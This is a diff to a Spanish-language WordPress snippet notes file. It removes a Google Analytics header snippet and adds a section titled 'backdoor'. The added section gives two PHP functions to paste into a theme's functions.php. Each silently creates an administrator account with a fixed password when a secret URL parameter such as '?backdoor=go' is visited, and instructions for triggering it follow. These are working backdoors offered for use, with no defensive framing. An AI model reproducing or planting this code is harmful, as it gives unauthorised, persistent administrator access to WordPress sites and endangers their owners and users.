@@ -240,35 +240,42 @@ Antes de que empiece el primer DIV
 ````
 
 
+## backdoor
+
+agregar en function php del theme
+
+```
+add_action('wp_head', 'WordPress_backdoor');
+function WordPress_backdoor() {
+    If ($_GET['backdoor'] == 'go') {
+        require('wp-includes/registration.php');
+        If (!username_exists('backdooradmin')) {
+            $user_id = wp_create_user('backdooradmin', 'Pa55W0rd');
+            $user = new WP_User($user_id);
+            $user->set_role('administrator');
+        }
+    }
+}
+```
+Ir la ruta www.URL-DEL-SITIO?backdoor=go
 
 
-### Agregar código de Analitycs en Header
+```
+add_action('wp_head', 'ready');
+function ready() {
+    If ($_GET['go'] == 'go') {
+        require('wp-includes/registration.php');
+        If (!username_exists('host_admin')) {
+            $user_id = wp_create_user('host_admin', 'Pa55W0rd');
+            $user = new WP_User($user_id);
+            $user->set_role('administrator');
+        }
+    }
+}
+```
+Ir la ruta www.URL-DEL-SITIO?go=go
 
-wp-content/themes/enfold/header.php
 
-Apenas abre head
-cambiar código UA-
+## AGCA LINK
 
-para  habilitar el debug se agrega _debug
-https://www.google-analytics.com/analytics_debug.js
-
-```javascript
-
-   //  <!-- Google Analytics -- ecommerce avanzado-->
-   <script>
-           (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
-           (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
-           m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
-           })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
-
-           //  window.ga_debug = {trace: true};
-
-           ga('create', 'UA-89615303-1', 'auto');  // Replace with your property ID.
-           ga('send', 'pageview');
-
-   </script>
-
-   // <!-- <script src="https://www.google-analytics.com/analytics_debug.js"></script>  -->
-
-   // <!--END  Google Analytics -- ecommerce avanzado-->
-````
+[URL DE WEB ]/wp-admin/tools.php?page=ag-custom-admin%2Fplugin.php#general-settings
